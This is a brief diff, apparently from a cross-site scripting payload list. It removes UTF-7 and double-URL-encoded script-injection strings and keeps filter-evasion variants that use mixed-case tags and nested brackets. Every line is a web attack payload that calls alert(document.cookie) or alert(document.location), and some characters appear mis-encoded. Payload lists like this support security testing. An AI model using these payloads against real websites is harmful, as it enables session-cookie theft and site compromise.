@@ -1,8 +1,4 @@
-+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
-%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
-+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
-%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
-%253cscript%253ealert(document.cookie)%253c/script%253e
+
 ì><sî%2bîcript>alert(document.cookie)</script>
 ì><ScRiPt>alert(document.cookie)</script>
 ì><<script>alert(document.cookie);//<</script>
